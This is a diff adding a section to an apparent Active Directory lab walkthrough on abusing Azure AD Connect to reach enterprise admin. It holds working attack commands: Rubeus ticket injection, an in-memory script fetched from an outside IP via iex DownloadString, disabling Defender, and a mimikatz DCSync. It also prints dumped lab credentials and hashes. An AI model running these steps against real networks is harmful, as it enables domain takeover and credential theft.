@@ -908,3 +908,73 @@ C:\AD\Tools\MS-RPRN.exe \\techcorp-dc.techcorp.local \\us-web.us.techcorp.local
 
 The next steps are the same from the previous Unconstrained Delegation.
 
+## Flag 36/37/38 - Azure Integration
+
+We can find out the machine where Azure AD Connect is installed by looking at the Description of special account whose name begins with MSOL\_.
+
+Using AD-Module:
+
+{% code overflow="wrap" %}
+```powershell
+Get-ADUser -Filter "samAccountName -like 'MSOL_*'" -Server techcorp.local -Properties * | select SamAccountName,Description | fl
+```
+{% endcode %}
+
+<figure><img src="../.gitbook/assets/immagine (31).png" alt=""><figcaption></figcaption></figure>
+
+We already have access to US-Adconnect as helpdeskadmin so we can extract MSOL account with adconnect.ps1
+
+<pre data-overflow="wrap"><code><strong>C:\AD\Tools\Loader.exe -Path C:\AD\Tools\Rubeus.exe -args asktgt /domain:us.techcorp.local /user:helpdeskadmin /aes256:f3ac0c70b3fdb36f25c0d5c9cc552fe9f94c39b705c4088a2bb7219ae9fb6534 /opsec /createnetonly:C:\Windows\System32\cmd.exe /show /ptt
+</strong></code></pre>
+
+Now open a invishell session on us-adconnect
+
+{% code overflow="wrap" %}
+```
+echo F | xcopy C:\AD\Tools\InviShell\InShellProf.dll \\us-adconnect\C$\Users\helpdeskadmin\Downloads\InShellProf.dll /Y
+```
+{% endcode %}
+
+{% code overflow="wrap" %}
+```
+echo F | xcopy C:\AD\Tools\InviShell\RunWithRegistryNonAdmin.bat \\us-adconnect\C$\Users\helpdeskadmin\Downloads\RunWithRegistryNonAdmin.bat /Y
+```
+{% endcode %}
+
+And now bypass the amsi and run the script in memory
+
+{% code overflow="wrap" %}
+```powershell
+iex (New-Object Net.WebClient).DownloadString('http://192.168.100.64/adconnect.ps1')
+```
+{% endcode %}
+
+{% hint style="info" %}
+if an error happen when launch "ADConnect" use `Set-MpPreference -drtm $true`
+{% endhint %}
+
+<figure><img src="../.gitbook/assets/immagine (32).png" alt=""><figcaption></figcaption></figure>
+
+MSOL\_16fb75d0227d : 70\&n1{p!Mb7K.C)/USO.a{@m\*%.+^230@KAc\[+sr}iF>Xv{1!{=/\}}3B.T8IW-{)^Wj^zbyOc=Ahi]n=S7K$wAr;sOlb7IFh}!%J.o0}?zQ8]fp&.5w+!!IaRSD@qYf
+
+Now as shell as this user can be created
+
+```
+runas /user:techcorp.local\MSOL_16fb75d0227d /netonly cmd
+```
+
+now launch invishell and import Invoke\_mimi
+
+{% hint style="info" %}
+If it's not working try to use a non elevated shell
+{% endhint %}
+
+{% code overflow="wrap" %}
+```
+Invoke-Mimi -Command '"lsadump::dcsync /user:techcorp\administrator /domain:techcorp.local"'
+```
+{% endcode %}
+
+<figure><img src="../.gitbook/assets/immagine (33).png" alt=""><figcaption></figcaption></figure>
+
+Enterprise admin rc4: bc4cf9b751d196c4b6e1a2ba923ef33f
